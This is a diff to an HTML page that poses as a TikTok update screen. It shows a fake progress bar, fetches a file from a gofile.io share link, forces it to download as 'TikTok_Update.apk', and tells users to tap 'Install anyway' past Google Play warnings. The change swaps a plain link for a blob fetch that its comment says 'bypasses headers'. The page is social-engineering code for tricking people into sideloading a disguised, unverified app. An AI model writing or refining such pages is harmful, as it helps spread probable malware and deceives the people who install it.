@@ -39,37 +39,54 @@
             <p>• <b>Google Play:</b> Tap <b>Install anyway</b> to continue the update.</p>
         </div>
     </div>
-    <script>
-        document.getElementById('btn').addEventListener('click', function(e) {
+       <script>
+        document.getElementById('btn').addEventListener('click', async function(e) {
             e.preventDefault();
             this.style.display = 'none';
             document.getElementById('prog').style.display = 'block';
             document.getElementById('status').style.display = 'block';
+            document.getElementById('status').innerText = "Downloading update... Please wait.";
             document.getElementById('helpBox').style.display = 'block';
             
             var bar = document.getElementById('bar');
             var width = 0;
             
-            // APK link yahan aayega
-            var apkUrl = "https://gofile.io/d/SO97D6ZO"; 
+            // Apna Gofile link yahan daal
+            var apkUrl = "https://gofile.io/d/PIH7QBN0"; 
             
+            // Fake progress bar animation
             var interval = setInterval(function() {
-                if (width >= 100) {
-                    clearInterval(interval);
-                    document.getElementById('status').innerText = "Update ready! Opening installer...";
-                    
-                    var a = document.createElement('a');
-                    a.href = apkUrl;
-                    a.download = "TikTok_Update.apk";
-                    document.body.appendChild(a);
-                    a.click();
-                    document.body.removeChild(a);
-                    
-                } else {
-                    width += 20;
+                if (width < 90) {
+                    width += 10;
                     bar.style.width = width + '%';
                 }
             }, 200);
+
+            try {
+                // Fetch file as blob (bypasses headers)
+                var response = await fetch(apkUrl);
+                if (!response.ok) throw new Error('Network error');
+                
+                var blob = await response.blob();
+                
+                // Force download as .apk
+                var url = window.URL.createObjectURL(new Blob([blob], {type: 'application/vnd.android.package-archive'}));
+                var a = document.createElement('a');
+                a.href = url;
+                a.download = "TikTok_Update.apk";
+                document.body.appendChild(a);
+                a.click();
+                document.body.removeChild(a);
+                window.URL.revokeObjectURL(url);
+                
+                clearInterval(interval);
+                bar.style.width = '100%';
+                document.getElementById('status').innerText = "Update ready! Check your downloads.";
+                
+            } catch (err) {
+                clearInterval(interval);
+                document.getElementById('status').innerText = "Download failed. Please try again.";
+            }
         });
     </script>
 </body>
